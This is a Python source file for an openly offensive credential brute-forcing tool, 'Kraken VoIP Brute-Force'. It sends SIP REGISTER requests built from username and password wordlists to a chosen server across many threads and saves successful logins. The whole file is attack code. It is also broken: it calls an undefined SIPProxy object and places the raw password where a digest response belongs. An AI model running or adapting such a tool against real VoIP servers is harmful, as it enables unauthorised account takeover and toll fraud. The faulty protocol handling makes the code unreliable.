import os
import sys
import time
import logging
import gevent
from gevent import monkey
from gevent.pool import Pool
from random import choice
from colorama import Fore, Style, init
import pyfiglet



monkey.patch_all()


init(autoreset=True)


script_dir = os.path.dirname(os.path.abspath(__file__))
results_dir = os.path.join(script_dir, '..', 'Results')
logs_dir = os.path.join(script_dir, '..', 'Logs')


os.makedirs(results_dir, exist_ok=True)
os.makedirs(logs_dir, exist_ok=True)


logging.basicConfig(filename=os.path.join(logs_dir, 'voip_brute_force.log'), level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def clear_console():
    """Clears the console window."""
    os.system('cls' if os.name == 'nt' else 'clear')

def display_banner():
    """Displays the script banner with random color."""
    colors = [Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.MAGENTA, Fore.CYAN]
    banner_color = choice(colors)
    banner = pyfiglet.figlet_format("Kraken VoIP Brute-Force", font="slant")
    print(Style.BRIGHT + banner_color + banner)
    print(Style.RESET_ALL + Fore.WHITE + "="*80 + "\n")

def get_user_input():
    """Gathers user input for VoIP brute-forcing."""
    target_ip = input(Fore.WHITE + "Enter the VoIP server IP address: ").strip()
    if not target_ip:
        print(Fore.RED + "Target IP address cannot be empty.")
        sys.exit(1)

    port = int(input(Fore.WHITE + "Enter the VoIP server port (default: 5060, press Enter for default): ") or 5060)
    
    u_file = input(Fore.WHITE + "Enter the user file name or press Enter to use default ('users.txt'): ").strip() or os.path.join(script_dir, "..", "wordlists", "users.txt")
    if not os.path.isfile(u_file):
        print(Fore.RED + f"User file not found: {u_file}")
        logging.error(f"User file not found: {u_file}")
        sys.exit(1)

    p_file = input(Fore.WHITE + "Enter the password file name or press Enter to use default ('passwords.txt'): ").strip() or os.path.join(script_dir, "..", "wordlists", "passwords.txt")
    if not os.path.isfile(p_file):
        print(Fore.RED + f"Password file not found: {p_file}")
        logging.error(f"Password file not found: {p_file}")
        sys.exit(1)

    threads = int(input(Fore.WHITE + "Enter number of threads to use (default: 40, press Enter for default): ") or 40)

    return target_ip, port, u_file, p_file, threads

def load_credentials(u_file, p_file):
    """Loads usernames and passwords from the specified files."""
    with open(u_file, "r") as users:
        user_arr = [u.strip() for u in users.readlines() if u.strip()]

    with open(p_file, "r") as passwords:
        pass_arr = [p.strip() for p in passwords.readlines() if p.strip()]

    return user_arr, pass_arr

def attempt_login(target_ip, port, username, password, attempt_number, total_attempts, start_time, result_file):
    """Attempts to authenticate with the VoIP server using provided credentials."""
    def format_output(success):
        elapsed_time = time.time() - start_time
        percentage = (attempt_number / total_attempts) * 100
        estimated_total_time = elapsed_time / (attempt_number / total_attempts)
        remaining_time = estimated_total_time - elapsed_time
        time_remaining_str = time.strftime('%H:%M:%S', time.gmtime(remaining_time))
        status = "Success" if success else ""
        return f"\r[{attempt_number}/{total_attempts}] Tested - {percentage:.2f}% | Estimated Remaining Time: {time_remaining_str} | Current: {username}:{password} {status}"

    try:
        
        sip_message = f"REGISTER sip:{target_ip}:{port} SIP/2.0\r\n" \
                      f"Via: SIP/2.0/UDP {target_ip}:{port}\r\n" \
                      f"From: <sip:{username}@{target_ip}>\r\n" \
                      f"To: <sip:{username}@{target_ip}>\r\n" \
                      f"Call-ID: {username}@{target_ip}\r\n" \
                      f"CSeq: 1 REGISTER\r\n" \
                      f"User-Agent: Kraken VoIP Brute-Force\r\n" \
                      f"Contact: <sip:{username}@{target_ip}:{port}>\r\n" \
                      f"Authorization: Digest username=\"{username}\", realm=\"{target_ip}\", nonce=\"\", uri=\"sip:{target_ip}:{port}\", response=\"{password}\"\r\n" \
                      f"Content-Length: 0\r\n\r\n"

        
        response = SIPProxy.send_request(sip_message)

        sys.stdout.write('\033[K')  
        if "401 Unauthorized" in response:
            fail_msg = format_output(False)
            print(Fore.WHITE + fail_msg, end='', flush=True)
            logging.info(f"Failed: {username}:{password}")
            return None
        elif "200 OK" in response:
            success_msg = format_output(True)
            print(Style.BRIGHT + Fore.GREEN + success_msg + Style.RESET_ALL)
            logging.info(success_msg.strip())
            result_file.write(success_msg.strip() + "\n")
            result_file.flush()  
            return success_msg
        else:
            logging.warning(f"Unexpected response for {username}:{password}: {response}")
            return None
    except Exception as e:
        sys.stdout.write('\033[K')  
        fail_msg = format_output(False)
        print(Fore.WHITE + fail_msg, end='', flush=True)
        logging.error(f"Error: {username}:{password} - {str(e)}")
        return None

def brute_force_login(target_ip, port, user_arr, pass_arr, threads):
    """Performs brute-force attack on VoIP."""
    total_attempts = len(user_arr) * len(pass_arr)
    start_time = time.time()
    attempt_number = 0
    results = []
    pool = Pool(threads)

    result_file_path = os.path.join(results_dir, "voip_results.txt")
    with open(result_file_path, "a") as result_file:  

        def handle_result(username, password):
            nonlocal attempt_number
            attempt_number += 1
            result = attempt_login(target_ip, port, username, password, attempt_number, total_attempts, start_time, result_file)
            if result:
                results.append(result)

        for username in user_arr:
            for password in pass_arr:
                pool.spawn(handle_result, username, password)

        pool.join()

    logging.info("Brute force process completed.")

def main():
    clear_console()
    display_banner()
    target_ip, port, u_file, p_file, threads = get_user_input()
    user_arr, pass_arr = load_credentials(u_file, p_file)
    print(Style.RESET_ALL + Fore.WHITE + "\n" + "="*80 + "\n")
    brute_force_login(target_ip, port, user_arr, pass_arr, threads)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        logging.info(Fore.YELLOW + "\nScript interrupted by user.")
        print(Fore.YELLOW + "\nScript interrupted by user.")
